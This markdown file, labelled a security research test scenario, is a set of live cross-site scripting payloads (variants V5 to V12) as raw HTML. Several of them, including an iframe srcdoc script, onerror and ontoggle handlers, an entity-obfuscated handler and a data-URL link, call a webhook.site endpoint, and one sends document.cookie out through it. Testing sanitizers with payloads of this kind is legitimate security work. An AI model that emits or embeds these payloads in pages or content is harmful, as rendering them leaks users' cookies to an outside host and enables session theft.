# Intro

Test scenario for security research.

## V5: iframe srcdoc

<iframe srcdoc="<script>fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-srcdoc?c=' + encodeURIComponent(document.cookie))</script>"></iframe>

## V6: style attr css exfil

<div style="background:url('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-css?c=x')"></div>

## V7: data url img svg

<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Ctext%3Ehi%3C/text%3E%3C/svg%3E">

## V8: form action

<form action="https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-form" method="GET"><input name="c" value="test"><button type="submit">submit</button></form>

## V9: entity obfuscation

<img src=x onerror&#x3d;"fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-entity')">

## V10: details ontoggle

<details open ontoggle="fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-toggle')">test</details>

## V11: video onerror

<video src=x onerror="fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-video')"></video>

## V12: a data url

<a href="data:text/html,%3Cscript%3Efetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss-datahref')%3C/script%3E">click</a>
